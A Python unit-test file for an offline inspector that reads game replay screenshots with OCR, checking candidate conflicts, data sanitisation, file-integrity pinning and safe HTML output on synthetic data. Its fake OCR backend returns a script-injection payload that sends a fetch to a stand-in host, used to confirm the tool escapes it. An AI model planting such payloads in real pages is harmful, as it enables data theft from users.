"""Critical read-only, privacy, candidate and conflict paths on generated data."""

from contextlib import redirect_stdout
from dataclasses import replace
from html.parser import HTMLParser
import io
import json
import os
import copy
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

from PIL import Image

from jcc_replay_demo.__main__ import main
from jcc_replay_demo.inspector import (
    DEPENDENCIES, PROJECT, InspectorError, digest, inspect_image, load_profile,
    load_source, run_inspection, safe_summary, structured_frame, verify_unchanged, attach_shop,
)
from jcc_replay_demo.render import CSP, render_page
from jcc_replay_demo.gold import check_gold_glyph
from jcc_replay_demo.integrations import CAPACITY_REVISION, economy_comparison, match_capacity, unknown_capacity
from jcc_replay_demo.shop import match_shop


class FakeOCR:
    """Declared replay metadata is fictional; pixels and all answers are fake."""

    def __init__(self, *, empty=False, error=False, injection=False):
        self.calls, self.closed = 0, False
        self.empty, self.error, self.injection = empty, error, injection

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.closed = True

    def recognize(self, _):
        values = ("2-1", "购买经验", "刷新", "7级", "2-1", "98", "10", "7级",
                  "2-1", "98", "11", "7级")
        index = self.calls % len(values)
        self.calls += 1
        if self.error:
            raise RuntimeError("PRIVATE_BACKEND_ERROR secret-account /private/source")
        if self.empty:
            return []
        text = '<script>fetch("https://invalid.example/leak")</script>SECRET_OCR' if self.injection and index == 0 else values[index]
        return [{"text": text, "x": 10, "y": 10, "width": 30, "height": 15, "confidence": 0.99}]


class PageParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tags = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


class InspectorTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.base = Path(self.temporary.name).resolve()
        self.source = self.base / "source"
        for p in (self.source, self.source / "assets", self.source / "manifests"):
            p.mkdir(mode=0o700)
        with Image.new("RGB", (640, 360), "#26334a") as image, io.BytesIO() as out:
            image.save(out, format="PNG")
            self.image = out.getvalue()
            with image.convert("RGBA") as rgba:
                self.pixels = digest(b"640x360:RGBA:" + rgba.tobytes())
        unknown = {"applicability": "undetermined", "truth_status": "unknown", "value": None,
                   "reason": "not_annotated", "region": None}
        record = {
            "schema_version": "sample-annotation-v1", "sample_kind": "real", "sample_id": "sample-generated",
            "dataset_id": "generated-only", "recording_session_id": "generated-session",
            "stream_id": "generated-stream", "host_clock_id": "generated-clock", "split": "quarantine",
            "dedupe_group_id": "generated-group", "state_group_id": "generated-state",
            "asset": {"asset_ref": "asset-generated", "sha256": digest(self.image), "access": "local_only", "redaction": "none"},
            "frame": {"frame_id": "generated-frame", "sequence": 0, "context_epoch": 0,
                      "host_received_monotonic_ms": 1.0, "device_capture_time": None,
                      "image": {"width_px": 640, "height_px": 360, "orientation": "landscape",
                                "rotation_applied_degrees": 0, "coordinate_space": "decoded_frame_normalized_top_left",
                                "game_viewport": None, "calibration_id": None}},
            "annotation_method": "human", "annotator_id": "generated-not-a-person", "reviewer_id": None,
            "review_status": "draft", "conditions": ["generated_test_not_real_review"],
            "labels": {**{k: dict(unknown) for k in ("scene", "phase", "mode", "game_version", "round", "hp", "gold", "level")},
                       "shop": [{"slot": slot, "content": dict(unknown)} for slot in range(1, 6)]},
        }
        asset = {"sha256": digest(self.image), "pixel_sha256": self.pixels, "width_px": 640, "height_px": 360,
                 "format": "PNG", "asset_ref": "asset-generated", "path": "assets/asset-generated.png", "sample_kind": "real"}
        self.workspace = {"schema_version": "sample-workspace-v1", "dataset_id": "generated-only", "revision": 1,
                          "annotations": [record], "assets": {"sample-generated": asset}, "events": []}
        self.write(self.source / asset["path"], self.image)
        self.write(self.source / "workspace.json", self.encode(self.workspace))
        self.write(self.source / "manifests/frozen.json", self.encode([record]))
        self.config = {
            "schema_version": "replay-inspector-profile-v1", "purpose": "private_development_history_only",
            "sample_kind": "replay", "capture_kind": "screenshot", "mode_key": None, "applied_rotation_degrees": 0,
            "source_root": str(self.source), "output_root": str(self.base / "runs"), "manifest_path": "manifests/frozen.json",
            "workspace_sha256": digest((self.source / "workspace.json").read_bytes()),
            "manifest_sha256": digest((self.source / "manifests/frozen.json").read_bytes()),
            "sample_ids": ["sample-generated"], "image_size": [640, 360], "layout_id": "generated-layout",
            "cues": [{"cue_id": "round_header", "box": [10, 10, 160, 70]},
                     {"cue_id": "shop_experience", "box": [10, 270, 160, 330], "exact_texts": ["购买经验"]},
                     {"cue_id": "shop_refresh", "box": [200, 270, 350, 330], "exact_texts": ["刷新"]},
                     {"cue_id": "level_label", "box": [400, 270, 550, 330]}],
            "numeric_scales": [1, 2], "fields": {
                "round": {"box": [10, 10, 160, 70]}, "hp": {"box": [200, 100, 350, 160]},
                "gold": {"box": [380, 100, 530, 160]}, "level": {"box": [400, 270, 550, 330], "syntax": "level_label"}},
            "dependency_sha256": {name: digest((PROJECT / name).read_bytes()) for name in DEPENDENCIES},
            "private_reference_key": "2" * 64,
        }
        self.profile_path = self.base / "profile.json"
        self.save_profile()

    @staticmethod
    def encode(value):
        return json.dumps(value, ensure_ascii=False).encode()

    @staticmethod
    def write(path, data):
        if path.exists():
            path.unlink()
        with os.fdopen(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600), "wb") as f:
            f.write(data)

    def save_profile(self):
        self.write(self.profile_path, self.encode(self.config))

    def inspect(self, backend=None):
        profile = load_profile(self.profile_path)
        batch = load_source(profile)
        return inspect_image(batch.images[0], profile, backend or FakeOCR()), batch, profile

    def test_candidates_conflict_and_semantic_unknown(self):
        frame, batch, profile = self.inspect()
        result = structured_frame(frame)
        self.assertEqual(result["scene"]["candidate"], "battle")
        self.assertEqual(result["phase"]["status"], "unknown")
        self.assertIsNone(result["fields"]["gold"]["candidate"])
        self.assertTrue(result["fields"]["gold"]["conflict"])
        self.assertEqual([p["candidate"] for p in result["fields"]["gold"]["variants"]], [10, 11])
        self.assertTrue(all(p["status"] == "unknown" and p["candidate"] is None for p in result["semantic_gate"].values()))
        self.assertFalse(result["advice_eligible"])
        self.assertEqual(result["source"]["freshness"], "not_live")
        verify_unchanged(batch, profile)

    def test_economy_conflicting_gold_never_calculates(self):
        frame, _, _ = self.inspect()
        economy = frame["economy"]
        self.assertEqual(economy["input_mapping"]["to_status"], "conflict")
        self.assertEqual(economy["result"]["status"], "blocked")
        self.assertTrue(all(r["gold_after_hypothetical_purchase"] is None and r["interest_delta"] is None
                            for r in economy["result"]["comparisons"]))

    def test_economy_explicit_mapping_and_independent_hypothesis_prices(self):
        frame, _, _ = self.inspect()
        for probe in frame["fields"]:
            if probe["field"] == "gold":
                probe.update(status="development_candidate", candidate=31, reason=None)
        for variant in frame["variants"]:
            for probe in variant["fields"]:
                if probe["field"] == "gold":
                    probe.update(status="development_candidate", candidate=31, reason=None)
        gold_roi = next(p["input_region"] for p in frame["fields"] if p["field"] == "gold")
        frame["gold_glyph_check"] = check_gold_glyph(
            self.image, roi=gold_roi, frame_ref=frame["frame_ref"], proposed_value=31)
        economy = economy_comparison(frame)
        self.assertEqual(economy["input_frame_ref"], frame["frame_ref"])
        self.assertEqual(economy["input_source_sha256"], digest(self.image))
        self.assertEqual(economy["result"]["gold_candidate"]["origin"], "replay_candidate")
        self.assertEqual([r["hypothetical_price"] for r in economy["result"]["comparisons"]], [1, 2, 3, 4, 5])
        self.assertEqual([r["gold_after_hypothetical_purchase"] for r in economy["result"]["comparisons"]], [30, 29, 28, 27, 26])
        self.assertEqual([r["interest_delta"] for r in economy["result"]["comparisons"]], [0, -1, -1, -1, -1])
        self.assertFalse(economy["result"]["execution_eligible"])
        self.assertFalse(economy["input_mapping"]["semantic_gate_upgraded"])
        for group in (frame["fields"], *(v["fields"] for v in frame["variants"])):
            next(p for p in group if p["field"] == "gold")["candidate"] = 1
        frame["gold_glyph_check"] = check_gold_glyph(
            self.image, roi=gold_roi, frame_ref=frame["frame_ref"], proposed_value=1)
        frame["economy"] = economy_comparison(frame)
        rows = frame["economy"]["result"]["comparisons"]
        self.assertEqual([r["status"] for r in rows], ["conditional"] + ["insufficient_candidate_gold"] * 4)
        self.assertTrue(all(r["gold_after_hypothetical_purchase"] is None for r in rows[1:]))
        self.assertEqual(safe_summary([frame])["economy_partial_frames"], 1)

    def test_unknown_gold_does_not_borrow_a_previous_frame(self):
        frame, _, _ = self.inspect(FakeOCR(empty=True))
        economy = frame["economy"]
        self.assertEqual(economy["input_mapping"]["to_status"], "unknown")
        self.assertIsNone(economy["result"]["gold_candidate"])
        self.assertTrue(all(r["gold_after_hypothetical_purchase"] is None for r in economy["result"]["comparisons"]))

    def test_unconfigured_capacity_is_unknown_without_implicit_reads(self):
        frame, _, _ = self.inspect()
        with patch("pathlib.Path.read_bytes", side_effect=AssertionError("must not read existing capacity output")):
            capacity = unknown_capacity(frame, "capacity_results_not_configured")
        self.assertEqual(capacity["status"], "unknown")
        self.assertIsNone(capacity["candidate"])
        self.assertEqual(capacity["reason"], "capacity_results_not_configured")

    def capacity_fixture(self, frame):
        config = {"config_sha256": "3" * 64, "layout_id": "generated-capacity", "input_roi": [20, 20, 180, 80], "scales": [1, 2]}
        row = {"schema_version": "capacity-probe-v1", "implementation_revision": CAPACITY_REVISION,
               "source_frame": {"encoded_sha256": frame["source_sha256"], "source_kind": "replay",
                                "image_size": [640, 360], "rotation_applied_degrees": 0},
               "layout_id": config["layout_id"], "input_roi": list(config["input_roi"]),
               "status": "development_candidate", "displayed_deployed": 2, "capacity": 3, "empty_slots": 1,
               "reason_codes": [], "context": {"phase": "unknown", "subject": "unknown",
                   "deployable_bench_unit": "unknown", "temporal_stability": "unverified_single_frame",
                   "review_status": "unreviewed_machine_agent_candidate"},
               "confidence": {"calibrated_probability": None, "basis": "same_apple_vision_backend_scale_comparison", "variants": [
                   {"scale": scale, "status": "development_candidate", "reason": None,
                    "raw_ocr_score": 0.95, "text_roi": [30, 30, 50, 50], "processing_seconds": 0.001}
                   for scale in (1, 2)]},
               "automatic_action": None, "accuracy": None, "processing_seconds": 0.01,
               "conditional_hint": "untrusted hint must not be copied"}
        document = {"schema_version": "capacity-probe-v1", "implementation_revision": CAPACITY_REVISION,
                    "config_sha256": config["config_sha256"], "frame_count": 1, "results": [row]}
        return config, document

    def test_capacity_exact_hash_and_revision_maps_only_overall_candidate(self):
        frame, _, _ = self.inspect()
        config, document = self.capacity_fixture(frame)
        result = match_capacity(frame, document, config, (640, 360))
        self.assertEqual(result["candidate"], {"displayed_deployed": 2, "capacity": 3, "empty_slots": 1})
        self.assertEqual(result["matched_source_sha256"], frame["source_sha256"])
        self.assertFalse(result["execution_eligible"])
        self.assertIsNone(result["automatic_action"])
        self.assertNotIn("untrusted hint", json.dumps(result))
        self.assertIn("若为己方备战", result["reminder_zh"])

    def test_capacity_missing_duplicate_and_unmatched_sources_are_unknown(self):
        frame, _, _ = self.inspect()
        for scenario in ("missing", "duplicate", "unmatched"):
            with self.subTest(scenario=scenario):
                config, doc = self.capacity_fixture(frame)
                if scenario == "missing":doc["results"] = []
                if scenario == "duplicate":doc["results"] *= 2
                if scenario == "unmatched":doc["results"][0]["source_frame"]["encoded_sha256"] = "4" * 64
                doc["frame_count"] = len(doc["results"])
                result = match_capacity(frame, doc, config, (640, 360))
                self.assertEqual(result["status"], "unknown")
                self.assertIsNone(result["candidate"])

    def test_capacity_old_revision_top_or_frame_is_rejected(self):
        frame, _, _ = self.inspect()
        for location in ("top", "frame"):
            config, doc = self.capacity_fixture(frame)
            (doc if location == "top" else doc["results"][0])["implementation_revision"] = "old"
            self.assertEqual(match_capacity(frame, doc, config, (640, 360))["status"], "unknown")

    def test_capacity_config_roi_and_geometry_changes_are_rejected(self):
        frame, _, _ = self.inspect()
        for change in ("config", "roi", "geometry", "schema"):
            config, doc = self.capacity_fixture(frame)
            if change == "config":doc["config_sha256"] = "4" * 64
            if change == "roi":doc["results"][0]["input_roi"][0] += 1
            if change == "geometry":doc["results"][0]["source_frame"]["image_size"][0] += 1
            if change == "schema":doc["schema_version"] = "old"
            self.assertEqual(match_capacity(frame, doc, config, (640, 360))["status"], "unknown")

    def test_capacity_conflict_cannot_expose_variant_values(self):
        frame, _, _ = self.inspect()
        config, doc = self.capacity_fixture(frame)
        row = doc["results"][0]
        row.update(status="unknown", displayed_deployed=None, capacity=None, empty_slots=None,
                   reason_codes=["variant_disagreement"])
        for variant in row["confidence"]["variants"]:
            variant.update(status="unknown", reason="discarded_due_to_unknown_result")
        result = match_capacity(frame, doc, config, (640, 360))
        self.assertEqual(result["status"], "unknown")
        self.assertIsNone(result["candidate"])
        self.assertNotIn("999998", json.dumps(result))
        self.assertEqual(result["reason_codes"], ["variant_disagreement"])

    def test_capacity_duplicate_missing_bool_or_out_of_range_scales_rejected(self):
        frame, _, _ = self.inspect()
        for scales in ([1, 1], [None, None], [1, 999], [True, 2], [1, False], [1, 2.0], [0, 2], [1]):
            with self.subTest(scales=scales):
                config, doc = self.capacity_fixture(frame)
                config.pop("scales")
                diagnostics = [copy.deepcopy(doc["results"][0]["confidence"]["variants"][0]) for s in scales]
                for item, scale in zip(diagnostics, scales):
                    if scale is None:item.pop("scale")
                    else:item["scale"] = scale
                doc["results"][0]["confidence"]["variants"] = diagnostics
                result = match_capacity(frame, doc, config, (640, 360))
                self.assertEqual(result["status"], "unknown")
                self.assertIsNone(result["candidate"])

    def test_capacity_fixed_scales_must_match_exactly(self):
        frame, _, _ = self.inspect()
        for scales in ([2, 1], [1, 3], [], [True, 2], [1, 1]):
            config, doc = self.capacity_fixture(frame)
            config["scales"] = scales
            self.assertEqual(match_capacity(frame, doc, config, (640, 360))["status"], "unknown")

    def test_capacity_layout_names_must_be_valid_and_nonempty_on_both_sides(self):
        frame, _, _ = self.inspect()
        for value in (None, "", " ", "invalid/name", "a" * 97, True):
            config, doc = self.capacity_fixture(frame)
            config["layout_id"] = value
            doc["results"][0]["layout_id"] = value
            self.assertEqual(match_capacity(frame, doc, config, (640, 360))["status"], "unknown")
        config, doc = self.capacity_fixture(frame)
        config.pop("layout_id")
        doc["results"][0].pop("layout_id")
        self.assertEqual(match_capacity(frame, doc, config, (640, 360))["status"], "unknown")

    def test_capacity_diagnostic_reason_basis_and_extra_values_are_rejected(self):
        frame, _, _ = self.inspect()
        for case in ("missing_reason", "wrong_basis", "pair", "extra_value", "unknown_pair"):
            with self.subTest(case=case):
                config, doc = self.capacity_fixture(frame)
                row = doc["results"][0]
                diag = row["confidence"]["variants"][0]
                if case == "missing_reason":diag.pop("reason")
                if case == "wrong_basis":row["confidence"]["basis"] = "unrecognized_backend"
                if case in ("pair", "unknown_pair"):diag["pair"] = [999998, 999999]
                if case == "extra_value":diag["capacity_value"] = 999998
                if case == "unknown_pair":
                    row.update(status="unknown", displayed_deployed=None, capacity=None, empty_slots=None,
                               reason_codes=["variant_disagreement"])
                result = match_capacity(frame, doc, config, (640, 360))
                self.assertEqual(result["status"], "unknown")
                self.assertIsNone(result["candidate"])
                self.assertNotIn("999998", json.dumps(result))

    def test_capacity_config_roi_and_actual_size_reject_boolean_equality(self):
        frame, _, _ = self.inspect()
        config, doc = self.capacity_fixture(frame)
        config["input_roi"] = [False, False, True, True]
        doc["results"][0]["input_roi"] = [0, 0, 1, 1]
        self.assertEqual(match_capacity(frame, doc, config, (640, 360))["reason"], "capacity_roi_or_layout_mismatch")
        config, doc = self.capacity_fixture(frame)
        doc["results"][0]["source_frame"]["image_size"] = [1, 1]
        self.assertEqual(match_capacity(frame, doc, config, (True, True))["reason"], "capacity_source_geometry_mismatch")

    def test_capacity_config_digest_cannot_be_missing_or_empty_on_both_sides(self):
        frame, _, _ = self.inspect()
        for value in (None, "", "invalid", True):
            config, doc = self.capacity_fixture(frame)
            config["config_sha256"] = doc["config_sha256"] = value
            self.assertEqual(match_capacity(frame, doc, config, (640, 360))["reason"], "capacity_config_mismatch")

    def two_frame_render_fixture(self):
        first, batch, profile = self.inspect()
        with Image.new("RGB", (640, 360), "#654321") as image, io.BytesIO() as out:
            image.save(out, format="PNG")
            second_image = replace(batch.images[0], order=2, sample_id="generated-second", data=out.getvalue())
        second = inspect_image(second_image, profile, FakeOCR())
        report = {"frames": [first, second], "summary": safe_summary([first, second]), "generated_utc": "synthetic"}
        return report, (batch.images[0], second_image), profile

    def test_render_accepts_two_exact_bound_frames(self):
        report, images, profile = self.two_frame_render_fixture()
        self.assertEqual(render_page(report, images, profile).count('class="image-box"'), 2)

    def test_render_rejects_reversed_missing_and_duplicate_images(self):
        report, images, profile = self.two_frame_render_fixture()
        for wrong in (tuple(reversed(images)), images[:1], (images[0], images[0])):
            with self.assertRaisesRegex(ValueError, "replay_render_binding_mismatch"):
                render_page(report, wrong, profile)

    def test_render_rejects_missing_or_crossed_result_hashes(self):
        report, images, profile = self.two_frame_render_fixture()
        for field in ("source_sha256", "economy", "capacity", "shop", "capacity_upstream", "shop_upstream"):
            with self.subTest(field=field):
                bad = copy.deepcopy(report)
                if field == "source_sha256":bad["frames"][0].pop(field)
                elif field == "capacity_upstream":bad["frames"][0]["capacity"]["matched_source_sha256"] = bad["frames"][1]["source_sha256"]
                elif field == "shop_upstream":bad["frames"][0]["shop"]["matched_source_sha256"] = bad["frames"][1]["source_sha256"]
                else:bad["frames"][0][field]["input_source_sha256"] = bad["frames"][1]["source_sha256"]
                with self.assertRaisesRegex(ValueError, "replay_render_binding_mismatch"):
                    render_page(bad, images, profile)
        for kind in ("economy", "capacity", "shop"):
            bad = copy.deepcopy(report)
            bad["frames"][0][kind].pop("input_source_sha256")
            with self.assertRaisesRegex(ValueError, "replay_render_binding_mismatch"):
                render_page(bad, images, profile)

    def shop_fixture(self, frame):
        config = {"run_id": "generated-shop-run", "layout_id": "generated-shop-layout"}
        missing = ["candidate_missing_or_rejected_in_variant", "no_text_in_roi"]
        slots = [{"slot": i, "status": "unknown", "name": {
                    "status": "candidate", "candidates": ["generated-key"], "reasons": [],
                    "variants": [{"scale": scale, "candidates": ["generated-key"],
                                  "eligible": ["generated-key"], "reasons": []} for scale in (1, 2)]},
                  "price": {"status": "unknown", "candidates": [987], "reference_cost": 987,
                            "reasons": list(missing), "variants": [
                                {"scale": 1, "candidates": [987], "eligible": [987], "reasons": []},
                                {"scale": 2, "candidates": [], "eligible": [], "reasons": ["no_text_in_roi"]}]},
                  "presence": "content_candidate", "occlusion": "not_detected",
                  "reference_cost_check": "agrees_with_unverified_reference",
                  "name_options": [{"key": "generated-key", "name": "合成名称"}], "reasons": list(missing),
                  "identity_verified": False, "visibility": "unverified", "font_legibility": "unverified"}
                 for i in range(1, 6)]
        row = {"format": "shop-probe-v1", "usage": "offline_development_only", "source_sha256": frame["source_sha256"],
               "image_size": [640, 360], "layout_id": config["layout_id"], "actionable": False, "accuracy": None,
               "issues": [], "device_capture_time": None, "elapsed_ms": 1.0, "slots": slots,
               "private_diagnostics": {"ocr": "SECRET_SHOP_OCR", "reference_cost": 987}}
        doc = {"revision": 1, "summary": {"format": "shop-probe-private-run-v1", "revision": 1,
                                         "run_id": config["run_id"], "frames": 1}, "frames": [row]}
        return config, doc

    def test_shop_exact_source_and_unknown_prices_without_reference_fill(self):
        frame, _, _ = self.inspect()
        config, doc = self.shop_fixture(frame)
        result = match_shop(frame, doc, config, (640, 360), [frame["source_sha256"]], completion_verified=True)
        self.assertEqual(result["matched_source_sha256"], frame["source_sha256"])
        self.assertTrue(all(s["names"] == ["合成名称"] and s["price_status"] == "unknown" for s in result["slots"]))
        for forbidden in ("987", "reference_cost", "SECRET_SHOP_OCR", "private_diagnostics"):
            self.assertNotIn(forbidden, json.dumps(result, ensure_ascii=False))
        self.assertFalse(result["prices_used_for_economy"])
        self.assertFalse(result["execution_eligible"])

    def test_shop_wrong_frame_duplicate_sources_or_missing_completion_are_unknown(self):
        frame, _, _ = self.inspect()
        for case in ("wrong_frame", "duplicate_shop", "duplicate_page", "missing_completion"):
            config, doc = self.shop_fixture(frame)
            hashes = [frame["source_sha256"]]
            if case == "wrong_frame":doc["frames"][0]["source_sha256"] = "5" * 64
            if case == "duplicate_shop":doc["frames"] *= 2; doc["summary"]["frames"] = 2
            if case == "duplicate_page":hashes *= 2
            result = match_shop(frame, doc, config, (640, 360), hashes, completion_verified=case != "missing_completion")
            self.assertEqual(result["status"], "unknown")
            self.assertTrue(all(not s["names"] for s in result["slots"]))

    def test_shop_occlusion_empty_and_conflict_suppress_identity(self):
        frame, _, _ = self.inspect()
        config, doc = self.shop_fixture(frame)
        slots = doc["frames"][0]["slots"]
        slots[0].update(status="occluded_candidate", occlusion="suspected", reasons=["body_overlay_text_cue"])
        blank = {"status": "unknown", "candidates": [], "reasons": ["no_candidate", "no_text_in_roi"],
                 "variants": [{"scale": scale, "candidates": [], "eligible": [], "reasons": ["no_text_in_roi"]}
                              for scale in (1, 2)]}
        slots[1].update(status="empty_candidate", presence="empty_candidate", name=copy.deepcopy(blank),
                        price=copy.deepcopy(blank), name_options=[], reference_cost_check="not_comparable",
                        reasons=["dark_low_variance_and_all_ocr_blank"])
        slots[2]["name"].update(status="conflict", candidates=["generated-key", "generated-other"],
                                 reasons=["candidate_disagreement"])
        slots[2]["name"]["variants"][1].update(candidates=["generated-other"], eligible=["generated-other"])
        slots[2]["name_options"].append({"key": "generated-other", "name": "另一合成名称"})
        slots[2].update(status="conflict", reference_cost_check="not_comparable",
                        reasons=sorted({"candidate_disagreement", *slots[2]["price"]["reasons"]}))
        result = match_shop(frame, doc, config, (640, 360), [frame["source_sha256"]], completion_verified=True)
        self.assertEqual([s["status"] for s in result["slots"][:3]], ["occluded_candidate", "empty_candidate", "conflict"])
        self.assertTrue(all(not s["names"] for s in result["slots"][:3]))
        self.assertTrue(all(s["price_status"] == "unknown" for s in result["slots"]))

    def completed_shop_files(self, frame):
        config, doc = self.shop_fixture(frame)
        root = self.base / "completed-shop-run"
        root.mkdir(mode=0o700)
        files = {"results.private.json": self.encode(doc), "summary.json": self.encode(doc["summary"]),
                 "synthetic.html": b"<!doctype html><p>synthetic only</p>"}
        for name, data in files.items():self.write(root / name, data)
        marker = {"revision": 1, "run_id": config["run_id"], "files_sha256": {name: digest(data) for name, data in files.items()}}
        marker_bytes = self.encode(marker)
        self.write(root / "COMPLETED.json", marker_bytes)
        config.update(directory=str(root), completed_sha256=digest(marker_bytes))
        return config, root

    def test_shop_completed_files_verified_and_corruption_rejected(self):
        frame, _, profile = self.inspect()
        config, root = self.completed_shop_files(frame)
        profile = replace(profile, shop_config=config)
        attach_shop([frame], profile)
        self.assertEqual(frame["shop"]["status"], "development_candidate")
        self.write(root / "results.private.json", b"PRIVATE_CORRUPTED_CONTENT")
        attach_shop([frame], profile)
        self.assertEqual(frame["shop"]["status"], "unknown")
        self.assertEqual(frame["shop"]["reason"], "shop_completed_file_hash_mismatch")
        self.assertNotIn("PRIVATE_CORRUPTED_CONTENT", json.dumps(frame["shop"]))

    def test_shop_missing_file_and_wrong_run_id_are_unknown(self):
        frame, _, profile = self.inspect()
        config, root = self.completed_shop_files(frame)
        wrong = dict(config, run_id="other-generated-run")
        attach_shop([frame], replace(profile, shop_config=wrong))
        self.assertEqual(frame["shop"]["reason"], "shop_completed_revision_or_run_mismatch")
        (root / "summary.json").unlink()
        attach_shop([frame], replace(profile, shop_config=config))
        self.assertEqual(frame["shop"]["status"], "unknown")
        self.assertTrue(all(s["price_status"] == "unknown" and not s["names"] for s in frame["shop"]["slots"]))

    def test_empty_ocr_is_unknown_with_null_values(self):
        frame, _, _ = self.inspect(FakeOCR(empty=True))
        self.assertTrue(all(p["status"] == "unknown" and p["candidate"] is None for p in frame["fields"]))
        self.assertEqual(frame["scene"]["scene"]["status"], "unknown")

    def test_backend_error_is_sanitized(self):
        frame, _, _ = self.inspect(FakeOCR(error=True))
        encoded = json.dumps(frame)
        self.assertNotIn("PRIVATE_BACKEND_ERROR", encoded)
        self.assertNotIn("secret-account", encoded)
        self.assertEqual(frame["raw_ocr"][0]["error"], "ocr_failed")
        self.assertTrue(all(p["candidate"] is None for p in frame["fields"]))

    def test_stable_reference_and_same_byte_integration_key(self):
        first, batch, profile = self.inspect()
        second = inspect_image(batch.images[0], profile, FakeOCR())
        self.assertEqual(first["frame_ref"], second["frame_ref"])
        self.assertEqual(structured_frame(first)["source_sha256"], digest(self.image))
        other = inspect_image(batch.images[0], replace(profile, reference_key=b"another-private-key"), FakeOCR())
        self.assertNotEqual(first["frame_ref"], other["frame_ref"])
        structured = json.dumps(structured_frame(first))
        self.assertNotIn("raw_ocr", structured)
        self.assertNotIn(str(self.source), structured)
        self.assertNotIn("input_region", structured)

    def test_safe_summary_excludes_raw_values_hashes_and_identities(self):
        frame, _, _ = self.inspect(FakeOCR(injection=True))
        safe = json.dumps(safe_summary([frame]))
        for value in ("SECRET_OCR", "invalid.example", str(self.source), digest(self.image), frame["frame_ref"], "candidate\""):
            self.assertNotIn(value, safe)

    def test_full_run_outputs_private_offline_artifacts_and_closes_worker(self):
        before = {str(p.relative_to(self.source)): p.read_bytes() for p in self.source.rglob("*") if p.is_file()}
        worker = FakeOCR(injection=True)
        page, summary = run_inspection(self.profile_path, lambda: worker)
        self.assertTrue(worker.closed)
        self.assertEqual(worker.calls, 12)
        self.assertTrue(summary["source_bytes_unchanged"])
        self.assertEqual(page.parent.stat().st_mode & 0o777, 0o700)
        for p in page.parent.iterdir():
            self.assertEqual(p.stat().st_mode & 0o777, 0o600)
        self.assertEqual(before, {str(p.relative_to(self.source)): p.read_bytes() for p in self.source.rglob("*") if p.is_file()})
        text = page.read_text()
        parser = PageParser()
        parser.feed(text)
        self.assertFalse(any(tag in {"script", "iframe", "form", "object"} for tag, _ in parser.tags))
        self.assertTrue(all(a["src"].startswith("data:image/png;base64,") for t, a in parser.tags if t == "img"))
        self.assertTrue(all(a["href"].startswith("#") for t, a in parser.tags if t == "a"))
        self.assertIn("connect-src 'none'", CSP)
        self.assertIn("&lt;script&gt;", text)
        self.assertIn("非实战建议", text)
        result = json.loads((page.parent / "candidates.json").read_bytes())
        self.assertEqual(result["frames"][0]["source_sha256"], digest(self.image))

    def test_changed_metadata_stops_before_worker(self):
        self.write(self.source / "workspace.json", b"{}")
        with self.assertRaisesRegex(InspectorError, "pinned_metadata_changed"):
            run_inspection(self.profile_path, lambda: self.fail("worker must not start"))

    def test_changed_asset_stops_before_worker(self):
        self.write(self.source / "assets/asset-generated.png", b"changed")
        with self.assertRaisesRegex(InspectorError, "asset_bytes_changed"):
            run_inspection(self.profile_path, lambda: self.fail("worker must not start"))

    def test_changed_source_after_inspection_is_detected(self):
        _, batch, profile = self.inspect()
        self.write(self.source / "workspace.json", b"{}")
        with self.assertRaisesRegex(InspectorError, "source_changed_during_run"):
            verify_unchanged(batch, profile)

    def test_resolution_is_not_scaled_or_inferred(self):
        self.config["image_size"] = [641, 360]
        self.save_profile()
        with self.assertRaisesRegex(InspectorError, "image_geometry_or_format_mismatch"):
            load_source(load_profile(self.profile_path))

    def test_private_permissions_and_symlinks(self):
        self.profile_path.chmod(0o644)
        with self.assertRaisesRegex(InspectorError, "unsafe_file_permissions"):
            load_profile(self.profile_path)
        self.profile_path.chmod(0o600)
        asset = self.source / "assets/asset-generated.png"
        target = self.base / "other.png"
        self.write(target, self.image)
        asset.unlink()
        asset.symlink_to(target)
        with self.assertRaisesRegex(InspectorError, "symlink_forbidden"):
            load_source(load_profile(self.profile_path))

    def test_source_output_overlap_and_cloud_locations_rejected(self):
        self.config["output_root"] = str(self.source / "outputs")
        self.save_profile()
        with self.assertRaisesRegex(InspectorError, "source_output_overlap"):
            load_profile(self.profile_path)
        self.config["output_root"] = str(self.base / "CloudStorage/outputs")
        self.save_profile()
        with self.assertRaisesRegex(InspectorError, "cloud_location_forbidden"):
            load_profile(self.profile_path)

    def test_live_scope_and_unlisted_samples_rejected(self):
        self.config["sample_kind"] = "live"
        self.save_profile()
        with self.assertRaisesRegex(InspectorError, "unsupported_profile_scope"):
            load_profile(self.profile_path)
        self.config["sample_kind"] = "replay"
        self.config["sample_ids"] = ["other-sample"]
        self.save_profile()
        with self.assertRaisesRegex(InspectorError, "sample_allowlist_mismatch"):
            load_source(load_profile(self.profile_path))

    def test_cli_failure_does_not_print_exception_or_raw_source(self):
        out = io.StringIO()
        with patch("jcc_replay_demo.__main__.run_inspection", side_effect=RuntimeError("SECRET_OCR /private/source")), redirect_stdout(out):
            result = main(["--profile", str(self.profile_path), "--no-open"])
        self.assertEqual(result, 2)
        self.assertNotIn("SECRET_OCR", out.getvalue())
        self.assertNotIn("/private/source", out.getvalue())
        self.assertEqual(json.loads(out.getvalue())["reason"], "private_inspection_failed")


if __name__ == "__main__":
    unittest.main()
